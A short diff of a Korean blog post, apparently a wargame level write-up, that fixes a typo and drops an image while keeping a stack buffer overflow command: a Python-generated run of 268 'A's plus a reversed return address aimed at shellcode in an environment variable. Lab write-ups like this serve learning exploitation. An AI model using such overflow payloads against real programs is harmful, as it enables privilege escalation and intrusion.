@@ -90,10 +90,8 @@ int main(){
 ./attackme `python -c 'print "A"*268+"\x22\xfc\xff\xbf"'`
 ```
 
-16진수로 나온 환경 변수 주소값을 거꿀로 해서 입력해야된다.
+16진수로 나온 환경 변수 주소값을 거꾸로 해서 입력해야된다.
 
 입력하고 my-pass 를 해야된다.
-
-![my-pass](/blog_img/level12.my_pass.png)
 
 password:it is like this
